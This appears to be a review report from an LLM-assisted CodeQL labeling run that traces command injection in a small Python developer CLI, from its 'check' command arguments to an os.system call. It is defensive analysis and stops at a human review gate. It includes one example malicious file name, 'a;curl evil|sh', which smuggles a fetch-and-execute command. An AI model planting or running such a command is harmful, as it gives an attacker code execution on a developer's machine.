# Phase 1 Review - Augur Step 3 LLM Labeling (Pass 2, CWE-78)

- **run_id:** `abilian-devtools-iris-pass2-step3-20261014`
- **generated_at:** 2026-10-14 (latest regeneration 2026-10-14T07:25:10+00:00: re-verified re-run of the 02:24:37+00:00 emission - all decisions independently re-checked against the DB snapshot; unchanged)
- **model used for labeling:** `glm-5.3` (via Claude Code CLI) - same model and labeling configuration as the autogluon and bikeshed runs; no change in labeling standard. The one recorded change: evidence was taken from the CodeQL DB's own source snapshot instead of the working tree (see §7.1).
- **scope:** Pass 2 only, narrowed to CWE-78 (Augur's default Pass 2 set 077/078/088 was narrowed per experiment scope). The pass 1 block in `labels.json` is an empty, schema-required compatibility placeholder - **no CWE-22 analysis was performed**.
- **status:** ⏸ **STOPPED at the human review gate.** Phase 2 (library/query generation, taint runs) will not start until this review is approved. No `review_decision.json` was written - that is the reviewer's call.
- **workspace note (recorded for the reviewer):** `iris/libraries/`, `iris/queries/`, `iris/results/`, `iris/report/` and `iris/diagnostics/` already contain Phase 2 artifacts produced earlier today by a prior session that continued past this gate. They were **not** produced, modified or re-run by this Step 3 execution; the signature decisions in `labels.json` are unchanged relative to that emission, so those artifacts remain consistent with these labels. This run regenerates Phase 1 labeling only, per scope.

## 1. Label counts by pass and role

| pass | entries | source | sink | sanitizer | summary | none |
| --- | --- | --- | --- | --- | --- | --- |
| 1 (placeholder) | 0 | - | - | - | - | - |
| 2 (CWE-78) | 3 | 1 | 2 | 0 | 0 | 0 |

By classification: **3 tp**, 0 candidate, 0 fp, 0 unknown.

Candidate rows processed: 2 sink + 0 source = **2**, both mapped 1:1 to entries, plus 1 supplementary entry (`p2-supp-001`) added from code evidence to compensate for an extraction gap. Audit trail in `labels_raw_pass2.json`; nothing silently dropped.

This project is tiny (the DB contains exactly two `.py` files; `main.py` is 72 lines and `__init__.py` is a license header), so a small entry count is expected, not a coverage failure - see the completeness cross-check in §7.5.

## 2. Top high-risk sinks (role=sink, classification=tp)

| API | site | why it matters |
| --- | --- | --- |
| `os.system` arg 0 | `src/abilian/devtools/main.py:16` | **The single command-execution call of the entire database.** `os.system(cmd)` runs the whole string through `/bin/sh -c` (full shell metacharacter interpretation, no quoting). `cmd` is caller-built: `check()` joins CLI-supplied file/directory names (`args_str = ' '.join(args2)`, line 31) and interpolates them **unquoted** into `run(f"ruff {args_str}")` / `run(f"flake8 {args_str}")` (lines 33-34). |
| `run(cmd)` wrapper, param 0 | `src/abilian/devtools/main.py:14` | Param-level wrapper sink: parameter 0 flows verbatim to `os.system(cmd)` at line 16 with no quoting, splitting or validation (`typer.secho` at line 15 is display only). |

**Sink ≠ vulnerability.** Per the labeling standard, `classification=tp` means attacker-influenced data demonstrably flows toward the dangerous argument position, not that an exploitable vulnerability is confirmed. Exploitability caveat (same class as bikeshed's `handleProfile`): the input boundary is the local CLI user; the route becomes attacker-relevant when `adt check` is invoked on untrusted names - e.g. an attacker-created file **whose name exists on disk and contains shell metacharacters** (`a;curl evil|sh`) inside a checked-out repository: `Path(arg).exists()` (line 26) filters only non-existing paths, not dangerous names. Also reviewed: all other `run()` call sites are fixed string literals (`mypy`/`pyright`/`vulture`/`deptry` at lines 35-38, `pip-audit`/`safety` at 44-45, `pytest` at 54), and `all()` (line 60) passes the literals `["src", "tests"]`. Note `run("mypy --show-error-codes {args_str}")` at line 35 is a plain string (no `f` prefix) - `args_str` is **not** interpolated there, so only the `ruff` and `flake8` lines carry tainted input.

## 3. Top broad source APIs

| API | classification | note |
| --- | --- | --- |
| `check` parameter 0 (`args: list[str]`) @ main.py:22 | tp (conf 0.8) | **Supplementary entry** - the sole external input boundary of the tool (`@app.command()` handler; `adt check <names>` via the `pyproject.toml` console script). Values demonstrably reach `os.system` via join + f-string. It was **not** a CSV candidate because sources.csv is empty (see §7.6). |

## 4. Sanitizer list

**None.** No quoting/escaping/allow-list exists anywhere in the DB snapshot (`shlex` is not even imported in the snapshot). `Path(arg).exists()` is an existence filter, not CWE-78 neutralization. Phase 2 must keep the mandatory `isBarrier` predicate with the `none()` fallback per WORKFLOW.md 5.2.3.

## 5. Refuted sink candidacies (fp)

None. Both sink CSV rows were confirmed at their sites; there were no wrapper functions with parameters that fail to reach the command argument, and no literal-only process calls to refute (the literal call sites live *inside* the confirmed `run` wrapper and are documented in its rationale instead).

## 6. Unresolved / low-confidence items (for reviewer attention)

- No entry is below the 0.55 re-ask threshold (minimum emitted confidence: 0.8), so no low-confidence re-ask was performed (WORKFLOW.md 4.4.4).
- `p2-supp-001` (`check` param 0) is flagged for reviewer attention **on provenance grounds**: it is not a CSV row. Confirm the keep-for-recall decision and the local-CLI threat model before Phase 2. Without it, pass 2 has no source and the taint query can produce zero paths.
- Open question for the reviewer: should Phase 2's `MySources.qll` generalize to *all* Typer `@app.command()`/`@app.callback()` handler parameters (recommended, mirrors the extraction intent), or source only `devtools.main.check` parameter 0?

## 7. Quality checks and known gaps

1. **Schema validation:** `labels.json` PASSES the local `assets/labels_schema.json` (validated by the embedded draft-2020-12-subset validator in `gen_labels_pass2.py`; the `jsonschema` package is not installed in this environment, same as the prior runs). The schema's `contains` constraint forces a `pass_id: 1` entry - satisfied by the empty placeholder.
2. **At least one sink per enabled pass:** Pass 2 has 2 tp sinks. ✔
3. **Duplicates removed / merges documented:** no exact duplicate rows existed (DR-1); each signature occurs at one site (DR-2/DR-3); the supplementary entry is `p2-supp-*`-prefixed and flagged (DR-4); empty CSV families are documented, not deleted (DR-5). ✔
4. **Argument index bounds:** the `flow_kind=argument` entry carries `arg_index=0` (the command-string parameter of `os.system`), matching the CSV. The wrapper's CSV `-1` was refined to `arg_index=0` (param 0 is the parameter that feeds the wrapped call) with the change recorded in the audit trail. ✔
5. **Extraction completeness cross-check:** an independent grep of the DB source snapshot for `subprocess|Popen|os.system|os.popen|pexpect|create_subprocess|shell=True|shlex|os.exec|pty.spawn` returns exactly one hit (`os.system` at main.py:16). The sink CSV covers it. ✔
6. **Known extraction gap (Phase 2 must compensate):** `sources.csv` is empty because `sources.ql`'s `isTyperHandler` requires `getADecorator()` to bind an `Attribute`, while every handler decorator here is a **Call** (`@app.command(...)`, `@app.callback()`). `MySources.qll` must source Typer command-handler parameters or the `check -> run -> os.system` path will never fire.
7. **DB snapshot vs working tree divergence (recorded, not used as evidence):** the DB (`abilian-devtools-db`, created 2026-05-26, 40 loc) indexed a `main.py` whose `run()` uses `os.system(cmd)`; the current on-disk `abilian-devtools_vuln/src/abilian/devtools/main.py` instead contains `shlex.split` + `subprocess.Popen` (no `os` import) at shifted line numbers. The CSV candidates match the **DB snapshot**, and Phase 2 runs against the DB, so labels are grounded in the snapshot (recovered read-only from the DB's own `src.zip`). The divergence was discovered via `src.zip` + CSV line-number mismatch; **no ground-truth or fix-report files were read** (the vulnerability review report, `cmd_sinks*.csv` and the safe-db in the dataset directory were deliberately not opened). Note that `sinks.ql`'s header comments (written in Step 2 from the on-disk file) describe `subprocess.Popen` and are stale relative to the actual extraction results.
8. **Threat-model note:** abilian-devtools is a local developer CLI. "External input" here means the command line of `adt check <names>` (local user; attacker-relevant when invoked on untrusted names, e.g. attacker-named files in a checked-out repo - see §2). No stdin/env/file-content/HTTP input surface exists in the DB snapshot.

## 8. Labeling standard (AutoGluon/Bikeshed-consistent, applied independently)

Roles per WORKFLOW.md 7.1 rubric + references/python.md: `source` = externally controllable input boundary; `sink` = command-execution API with its dangerous argument position identified, wrappers only when the parameter reaches the command argument; `sanitizer` only with concrete neutralization evidence (none found); `summary` = taint-propagating internal helper (none needed - `run` is labeled as a wrapper sink per the CSV candidacy, and `str.join`/f-string interpolation are handled natively by CodeQL taint tracking); `none` = unrelated. `classification` records evidence strength (tp / fp / candidate), never a vulnerability verdict. Ordinary function parameters are not auto-promoted to sources (references/python.md §7.4) - the only source emitted is the Typer command-handler boundary with a demonstrated path to the sink. The prior projects' workspaces were not read; only the shared standard was reproduced.

## 9. Reproducibility

Artifacts: `labels.json` (schema-valid), `labels_raw_pass2.json` (2-row audit trail + batches + dedup rules DR-1..DR-5 + supplementary-entry provenance + empty-source-CSV root-cause analysis), `label_stats.md`, `phase1_review.md`, generator `gen_labels_pass2.py` (deterministic: fixed decision tables, no LLM call at generation time - the LLM decisions are the reviewed tables above).

**Next step (blocked):** human review of this document → `review_decision.json` → Phase 2 Step 4 (generate `MySources/MySinks/MySanitizers/MySummaries.qll`).
